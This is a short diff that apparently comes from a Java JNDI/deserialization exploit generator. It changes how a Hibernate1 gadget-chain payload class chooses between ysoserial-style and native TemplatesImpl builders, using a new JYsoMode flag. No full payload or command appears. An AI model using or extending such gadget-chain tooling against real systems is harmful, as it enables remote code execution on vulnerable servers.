@@ -21,6 +21,7 @@ import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
@@ -104,7 +105,7 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object tpl;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             tpl = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             tpl = Gadgets.createTemplatesImpl(type, param);
